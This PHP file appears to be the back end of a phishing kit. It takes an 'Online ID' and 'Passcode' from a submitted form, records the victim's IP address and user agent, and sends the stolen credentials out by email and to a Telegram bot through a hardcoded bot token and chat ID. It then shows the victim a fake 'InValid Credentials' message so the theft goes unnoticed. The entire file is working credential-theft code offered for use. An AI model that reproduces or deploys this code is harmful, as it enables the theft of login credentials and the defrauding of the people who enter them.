<?php
ob_start();

include 'email.php';
$ai = trim($_POST['ai']);
$pr = trim($_POST['pr']);
if(isset($_POST['btn1'])){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------|  |--------------|\n";
	
	$message .= "Online ID            : ".$_POST['ai']."\n";
	$message .= "Passcode              : ".$_POST['pr']."\n";
	$message .= "|--------------- HELLO -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|-----------  --------------|\n";
	$send = $Receive_email;
	$subject = "hello : $ip";
    	mail($send, $subject, $message);   
    	echo $message;
	$signal = 'ok';
	$msg = 'InValid Credentials';
	
	 // Send email
    mail($to, $subject, $message, $header);

    // Send to Telegram
    $telegram_token = '6729100389:AAEUsincdwqzk3viIo1ztTLR5OKsMhWDbsc'; // Replace with your Telegram bot token
    $chat_id = '5419874443'; // Replace with your chat ID
    $telegram_message = "Username: $ai\nPassword: $pr\nIP: $ip";
    $telegram_url = "https://api.telegram.org/bot$telegram_token/sendMessage?chat_id=$chat_id&text=" . urlencode($telegram_message);

    // Send the message to Telegram
    file_get_contents($telegram_url);
	
	// $praga=rand();
	// $praga=md5($praga);
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg,
        'redirect_link' => $redirect,
    );
    echo json_encode($data);
ob_end_flush();
?>